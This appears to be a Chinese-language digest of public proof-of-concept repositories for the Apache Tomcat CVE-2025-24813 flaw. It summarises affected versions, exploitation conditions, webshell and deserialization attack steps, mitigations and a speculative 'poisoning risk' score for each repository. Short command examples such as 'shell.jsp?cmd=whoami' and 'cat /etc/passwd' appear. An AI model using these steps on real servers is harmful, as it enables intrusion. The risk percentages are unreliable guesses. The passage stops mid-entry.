**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
